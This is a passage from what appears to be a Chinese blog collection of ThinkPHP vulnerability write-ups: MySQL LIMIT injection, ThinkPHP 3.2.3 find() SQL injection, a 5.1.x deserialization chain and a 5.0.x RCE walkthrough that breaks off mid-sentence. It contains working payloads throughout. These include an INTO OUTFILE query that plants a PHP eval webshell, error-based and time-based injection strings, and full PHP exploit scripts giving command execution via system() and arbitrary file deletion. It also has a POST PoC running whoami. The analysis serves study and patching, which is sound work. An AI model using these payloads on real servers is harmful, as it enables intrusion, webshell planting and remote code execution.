class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class=\"line\">      [HIGH_PRIORITY]</span><br><span class=\"line\">      [STRAIGHT_JOIN]</span><br><span class=\"line\">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class=\"line\">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class=\"line\">    select_expr [, select_expr ...]</span><br><span class=\"line\">    [FROM table_references</span><br><span class=\"line\">    [WHERE where_condition]</span><br><span class=\"line\">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class=\"line\">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class=\"line\">    [HAVING where_condition]</span><br><span class=\"line\">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class=\"line\">      [ASC | DESC], ...]</span><br><span class=\"line\">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]   &#x2F;&#x2F;这里</span><br><span class=\"line\">    [PROCEDURE procedure_name(argument_list)]</span><br><span class=\"line\">    [INTO OUTFILE &#39;file_name&#39; export_options</span><br><span class=\"line\">      | INTO DUMPFILE &#39;file_name&#39;</span><br><span class=\"line\">      | INTO var_name [, var_name]]</span><br><span class=\"line\">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>\n\n<p>根据文章 有 <code>两种方式</code><br> <code>limit</code> 关键字后面还有 <code>PROCEDURE</code> 和 <code>INTO</code> 关键字，<code>INTO 关键字在有写权限可以用来写文件</code>，这里看一下 <code>PROCEDURE</code> 关键字.MySQL默认可用的存储过程只有 ANALYSE (doc)</p>\n<h3 id=\"PROCEDURE\"><a href=\"#PROCEDURE\" class=\"headerlink\" title=\"PROCEDURE\"></a>PROCEDURE</h3><p>报错注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\"> </span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39;</span><br></pre></td></tr></table></figure>\n\n<p>时间盲注</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select </span><br><span class=\"line\">extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"INTO\"><a href=\"#INTO\" class=\"headerlink\" title=\"INTO\"></a>INTO</h3><p>尝试利用 <code>into outfile</code> 写shell 虽然<code>dumpfile</code>也可以写文件但是因为 <code>dumpfile</code> 后面没有附加参数<code>(export_options)</code> 这点是 <code>into outfile</code> 利用的关键</p>\n<p>看一下后面的参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT ... INTO OUTFILE &#39;file_name&#39;</span><br><span class=\"line\">        [CHARACTER SET charset_name]</span><br><span class=\"line\">        [export_options]</span><br><span class=\"line\"></span><br><span class=\"line\">export_options:</span><br><span class=\"line\">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class=\"line\">        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符</span><br><span class=\"line\">        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]</span><br><span class=\"line\">        [ESCAPED BY &#39;char&#39;]</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    [LINES</span><br><span class=\"line\">        [STARTING BY &#39;string&#39;]</span><br><span class=\"line\">        [TERMINATED BY &#39;string&#39;]</span><br><span class=\"line\">    ]</span><br></pre></td></tr></table></figure>\n<p><code>OPTION</code> 参数为可选参数选项，其可能的取值有：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#96;FIELDS TERMINATED BY &#39;字符串&#39;&#96;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;FIELDS ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;FIELDS ESCAPED BY &#39;字符&#39;&#96;：设置转义字符，只能为单个字符。默认值为“\\”。</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;LINES STARTING BY &#39;字符串&#39;&#96;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;LINES TERMINATED BY &#39;字符串&#39;&#96;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。</span><br></pre></td></tr></table></figure>\n\n<p>给出payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/71f97b7605f14a3daf079aeb2f88436a.png\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP 3.2.3 find/select/delete注入","url":"/2023/12/25/ThinkPHP%20v3.2.3%20find%E5%87%BD%E6%95%B0%E5%BC%95%E8%B5%B7%E7%9A%84sql%E6%B3%A8%E5%85%A5/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>select()、find()、delete()三个函数可以传入数组数据导致sql注入</p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><p>\\Application\\Home\\Controller\\IndexController.class.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122004812.png\"></p>\n<a id=\"more\"></a>\n<p>配置好数据库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122050465.png\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>先给出payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;?id[where]&#x3D;1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<p>跟进 <code>I()</code> 函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122156141.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122231379.png\"></p>\n<p>获取了传进去的内容</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122244405.png\"></p>\n<p>M函数就不看了，进入find函数</p>\n<p>因为这里<code>$options</code>是一个数组所以这里跳过第一个if判断</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122340610.png\"></p>\n<p>这个getPk函数是查找mysql主键的函数</p>\n<p>紧接着一个if判断:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2021071912235649.png\"></p>\n<p>因为这里的<code>$pk</code>不是一个数组，所以直接跳出</p>\n<p>进入一个_parseOptions()函数:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122420524.png\"></p>\n<p>跟进:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122444880.png\"></p>\n<p>使用array_merge函数将 <code>$options</code> 与options合并，合并结果还是 <code>$option</code>  因为 $this-&gt;option 是一个空数组</p>\n<p>获取到了表名等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122537781.png\"></p>\n<p>这里到了重点:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122651570.png\"></p>\n<p>这里判断 <code>$options[where]</code> 不是一个数组，所以没有进入if判断直接跳出</p>\n<p>进入 <code>_options_filter</code> 函数，是空的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122737555.png\"></p>\n<p>从此跳出了 _parseOptions() 函数返回了 <code>find</code> 函数</p>\n<p>紧接着进入<code>select</code>函数:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122817797.png\"></p>\n<p>跟进:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122833588.png\"></p>\n<p>重点跟进 <code>buildSelectSql</code> 函数:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122854324.png\"></p>\n<p>跟进parseSql函数：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122905402.png\"></p>\n<p>重点看这个parseWhere:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719122922170.png\"></p>\n<p>这里判断为字符串直接返回:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123009526.png\"></p>\n<p>parseSql函数返回sql语句:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123030237.png\"></p>\n<p>进行查询:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123048295.png\"><br>更换payload为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;?id&#x3D;1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>\n\n<p>跟进到_parseOptions这里时出现了不同：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123132857.png\"><br><code>_parseType</code> 函数对where进行处理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123158412.png\"><br>跟进函数：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2021071912321672.png\"></p>\n<p>这里经过intval处理后，消除了注入语句</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>关键在于find函数第一步的处理这里</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123321942.png\"></p>\n<p><code>_parseOptions</code> :</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719123344626.png\"></p>\n<p>如果传进去的是 <code>$id[where]</code> 那么 <code>$options[&#39;where&#39;]</code> 为字符串不进行操作，如果传进去是 <code>$id</code> 那么 <code>$options[&#39;where&#39;]</code> 为数组，<code>$options[&#39;where&#39;][id]</code> 才是字符串，所以进行了处理</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public function find($options&#x3D;array()) &#123;                  &#x2F;&#x2F;$options &#x3D; String</span><br><span class=\"line\">        if(is_numeric($options) || is_string($options)) &#123;</span><br><span class=\"line\">            $where[$this-&gt;getPk()]  &#x3D;  $options;         &#x2F;&#x2F;$where[&#39;id&#39;] &#x3D; String</span><br><span class=\"line\">            $options &#x3D; array();</span><br><span class=\"line\">            $options[&#39;where&#39;] &#x3D; $where;        &#x2F;&#x2F;$options[&#39;where&#39;] &#x3D; &#123;&quot;id&quot;:String&#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>此外不仅仅 <code>parseWhere()</code>可以触发，与之类似拼接的 <code>parseGroup()</code>、<code>parseHaving()</code>、<code>parseOrder()</code>， <code>parseTable()</code>也能触发，可以用<code>id[where]</code> 和 <code>id[alias]</code>等参数触发</p>\n<p>修复：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20210719124110571.png\"></p>\n<p>在_parseOptions函数处理时不传入<code>$options</code>，这样经过_parseOptions处理过后，$option始终为空.</p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v5.1.x 反序列化 分析","url":"/2023/12/25/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/","content":"<h1 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h1><p>Thinkphp 5.1.38</p>\n<p>写入反序列化点</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9876ebb1f8844c99ab1de920d8414e48.png\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>exp:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">namespace think;</span><br><span class=\"line\">abstract class Model&#123;</span><br><span class=\"line\">    protected $append &#x3D; [];</span><br><span class=\"line\">    private $data &#x3D; [];</span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;append &#x3D; [&quot;Y0ng&quot;&#x3D;&gt;[]];</span><br><span class=\"line\">        $this-&gt;data &#x3D; [&quot;Y0ng&quot;&#x3D;&gt;new Request()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Request&#123;</span><br><span class=\"line\">    protected $filter;</span><br><span class=\"line\">    protected $hook &#x3D; [];</span><br><span class=\"line\">    protected $config &#x3D; [</span><br><span class=\"line\">        &#x2F;&#x2F; 表单ajax伪装变量</span><br><span class=\"line\">        &#39;var_ajax&#39;         &#x3D;&gt; &#39;&#39;,</span><br><span class=\"line\">        </span><br><span class=\"line\">    ];</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;filter &#x3D; &#39;system&#39;;</span><br><span class=\"line\">        $this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace think\\model;</span><br><span class=\"line\"></span><br><span class=\"line\">use think\\Model;</span><br><span class=\"line\"></span><br><span class=\"line\">class Pivot extends Model</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace think\\process\\pipes;</span><br><span class=\"line\"></span><br><span class=\"line\">use think\\model\\Pivot;</span><br><span class=\"line\">use think\\Process;</span><br><span class=\"line\">class Windows</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private $files;</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;files &#x3D; [new Pivot()];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo urlencode(serialize(new Windows()));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>get任意传参</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/27f43abaa6ca4eaf9d098c43f54788a5.png\"></p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p>以<code>__destruct为入口</code> 全局搜索</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b1c625471f7541c1a38e620d6fb29683.png\"></p>\n<blockquote>\n<p>thinkphp\\library\\think\\process\\pipes\\Windows.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/98ceaa7dfeb54ffbab1615d2949a67e9.png\"></p>\n<p>两个函数</p>\n<p>close()进行关闭连接操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d999e5e41193423888bfa56af42deeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>removefiles()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d006c0c3c88846a0aaf73ade99cc6304.png\"></p>\n<p>可以任意文件删除 exp:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace think\\process\\pipes;</span><br><span class=\"line\">class Windows</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private $files &#x3D; [];</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;files&#x3D;[&#39;0&#39;&#x3D;&gt;&#39;D:\\phpstudy_pro\\WWW\\test.txt&#39;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo base64_encode(serialize(new Windows()));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>用到了 <code>file_exists</code> 函数会将参数当作字符串来进行处理，可以用来<code>触发__toString</code></p>\n<p>全局搜索 __toString</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/eca90d6f93294d639fb1069d43b1b6fc.png\"></p>\n<blockquote>\n<p>thinkphp\\library\\think\\model\\concern\\Conversion.php</p>\n</blockquote>\n<blockquote>\n<p>trait Conversion</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/92e9511eee714f9bbc41f9a7e34a6810.png\"></p>\n<p>跟进toJson()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6f7a91fce5314f34a0b5ff1f6fafe4d2.png\"></p>\n<p>跟进toArray()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/dd8543ff440c4509acf9a5278e97459a.png\"></p>\n<p>摘取部分代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 追加属性（必须定义获取器）</span><br><span class=\"line\">        if (!empty($this-&gt;append)) &#123;</span><br><span class=\"line\">            foreach ($this-&gt;append as $key &#x3D;&gt; $name) &#123;</span><br><span class=\"line\">                if (is_array($name)) &#123;</span><br><span class=\"line\">                    &#x2F;&#x2F; 追加关联对象属性</span><br><span class=\"line\">                    $relation &#x3D; $this-&gt;getRelation($key);</span><br><span class=\"line\"></span><br><span class=\"line\">                    if (!$relation) &#123;</span><br><span class=\"line\">                        $relation &#x3D; $this-&gt;getAttr($key);</span><br><span class=\"line\">                        if ($relation) &#123;</span><br><span class=\"line\">                            $relation-&gt;visible($name);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br></pre></td></tr></table></figure>\n<p>append 可控所以 key 与 name可控，relation是通过 <code>getRelation</code> 获得，跟进</p>\n<blockquote>\n<p>thinkphp\\library\\think\\model\\concern\\RelationShip.php</p>\n</blockquote>\n<blockquote>\n<p>trait RelationShip</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/151127c627e3426189a3835370452b5a.png\"></p>\n<p>这里肯定 <code>要求返回空</code> 也就是if和elseif都不进入<br>接着 <code>进入getAttr</code></p>\n<blockquote>\n<p>thinkphp\\library\\think\\model\\concern\\Attribute.php</p>\n</blockquote>\n<blockquote>\n<p>trait Attribute</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/69825bf3032d48fb83afaa19be5cc2d4.png\"></p>\n<p>返回值为 <code>return $value;</code></p>\n<p>跟进getData</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b6c382cb9f5e46c5b3ffcc5c5c11200f.png\"></p>\n<p>因为上面 <code>三个都是trait</code>，全局搜索<code>找一个同时继承三个triat的子类</code></p>\n<blockquote>\n<p>thinkphp\\library\\think\\Model.php<br>abstract class Model 抽象类</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/0060dd1347a74ae08e5bba240ce332a3.png\"></p>\n<p>先找一下实现类</p>\n<blockquote>\n<p>\\thinkphp\\library\\think\\model\\Pivot.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/610def2a94a5466c8945abdedc8308b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_13,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>回到 <code>$relation-&gt;visible([$attr]);</code></p>\n<p>利用有两条路走</p>\n<ol>\n<li>   visible方法中存在利用</li>\n<li>   触发__call方法</li>\n</ol>\n<p>全局寻找visible方法，三处无利用点，尝试寻找_call方法</p>\n<blockquote>\n<p>thinkphp\\library\\think\\Request.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/585147d65d0e4b5aa0f91830894666c7.png\"></p>\n<p><code>$this-&gt;hook[$method]</code> 可控 <code>$args</code> 可控</p>\n<p>但是存在</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array_unshift($args, $this);</span><br></pre></td></tr></table></figure>\n<p>本来 $args 作为命令参数可控，由于 <code>array_unshift()向数组插入新元素时会将新数组的值将被插入到数组的开头</code>，导致参数不可控</p>\n<p>那么尝试再去<code>调用其他方法 且参数可控</code></p>\n<blockquote>\n<p>在Thinkphp的Request类中还有一个filter功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖filter的方法去执行代码</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/521e7e42c82046bea6cc2f52c84c7962.png\"></p>\n<p>利用点肯定是这里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$value &#x3D; call_user_func($filter, $value);</span><br></pre></td></tr></table></figure>\n<p>但是两个参数都不可控，就去<code>向上找谁调用了filterValue</code> 看看能不能控制传入filterValue的参数</p>\n<p>找到这个类的input方法：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5dc6f1abc5a44265bbae56eb92bbe555.png\"></p>\n<p>$data依旧不可控，继续往上寻找调用input的函数,找到 <code>param</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d8abf1ed6bf7425fa89feb2b89aba5f5.png\"></p>\n<p>$name依旧不可控，接着往上寻找isAjax()</p>\n<p>$this-&gt;config[‘var_ajax’] 可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/13b31e34c8de4b9ba29077ce3a2f5cb8.png\"></p>\n<p>在 <code>isAjax</code> 函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，意味着 <code>param</code> 函数中的<code>$name</code> 可控。param函数中的 <code>$name</code>可控就意味着 <code>input函数中的 $name</code> 可控。</p>\n<p>倒着梳理一下<br>在 <code>input中$this-&gt;param</code> 是通过与 <code>get传参进来的参数进行合并 传入input中的$data</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7cffa166026a42eda95251b2ed3c7753.png\"></p>\n<p>再看input中的这三句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$data &#x3D; $this-&gt;getData($data, $name);</span><br><span class=\"line\">$filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class=\"line\">$this-&gt;filterValue($data, $name, $filter);</span><br></pre></td></tr></table></figure>\n\n<p><strong>$data = $this-&gt;getData($data, $name)</strong><br>$name就是<code>$this-&gt;config[&#39;var_ajax&#39;]</code> 即 $data=$data[$name]</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f35f4653edcb44989e9eee826a3344b5.png\"></p>\n<p><strong>$filter = $this-&gt;getFilter($filter, $default)</strong></p>\n<p><code>$filter=&#39;&#39;</code> 进入else分支 返回$this-&gt;filter也就是可控的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f9f11e9acee5485db5a38508f142c733.png\"></p>\n<p><strong>$this-&gt;filterValue($data, $name, $filter)</strong></p>\n<p>$data可控 $filter 可控 成功rce</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e9ce2a4177454821a59185d5c3d03c19.png\"></p>\n<h1 id=\"大概流程\"><a href=\"#大概流程\" class=\"headerlink\" title=\"大概流程\"></a>大概流程</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/d03ec49af3634e1290cda711d406e764.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v5 RCE漏洞分析与收集","url":"/2023/12/25/ThinkPHP%20v5.x%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%B6%E9%9B%86/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>具体分析 <a href=\"http://www.yongsheng.site/2022/04/25/TP5%E6%94%B9%E9%80%A0/\">ThinkPHPv5 RCE改造 | Y0ng的博客 (yongsheng.site)</a></p>\n<p>Thinkphp5 rce分两个大版本</p>\n<ol>\n<li>   ThinkPHP 5.0-5.0.24</li>\n<li>   ThinkPHP 5.1.0-5.1.30</li>\n</ol>\n<p>方法主要分为两种</p>\n<p><code>1.Request中的filter变量覆盖导致RCE 分开启debug和不开启debug</code> 两种情况</p>\n<p><code>2.路由控制不严谨导致的RCE</code></p>\n<p>先分析第一种rce 即 <code>method __contruct导致的rce</code></p>\n<p>这里用5.0.5分析</p>\n<a id=\"more\"></a>\n\n<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?s&#x3D;index&#x2F;index</span><br><span class=\"line\">POST：</span><br><span class=\"line\">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"开启debug\"><a href=\"#开启debug\" class=\"headerlink\" title=\"开启debug\"></a>开启debug</h2><p>当 <code>application\\config.php    中的app_debug = true</code></p>\n<p>单入口文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b1e2b08dc3d44dcfaab4d1d9108142dd.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a3875bfeb8f24e128b74dc6c8b1ef990.png\"></p>\n<p>进入<code>run()</code> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/09256c2ce9694cb28331ec0802a692d6.png\"></p>\n<p>首先初始化<code>$request</code> 这个数组，<code>self::initCommon()</code>;初始化公共配置。未设置调度信息则进行 URL 路由检测 <code>self::routeCheck($request, $config)</code> 默认进入。</p>\n<p>跟进 routeCheck()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a7593d0362494070b5c032ae33e7b48c.png\"></p>\n<p>默认<code>self::$routeCheck</code> <code>self::$routemust</code> 为空，整体流程看图</p>\n<p>跟进 <code>Route::check</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f0ace01c7f9b4174ad8909d6a3589d49.png\"></p>\n<p>进入到Request.php中的method()方法中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ab29f838e3ac4f25bb2d851bc78c8a6a.png\"></p>\n<p>首先进入<code>elseif分支</code>，接着 <code>isset($_POST[Config::get(&#39;var_method&#39;)])</code> ， <code>var_method 默认为 _method</code></p>\n<p>并执行 <code>$this-&gt;&#123;$this-&gt;method&#125;($_POST)</code> 语句。因此通过<code>指定_method</code>即可完成 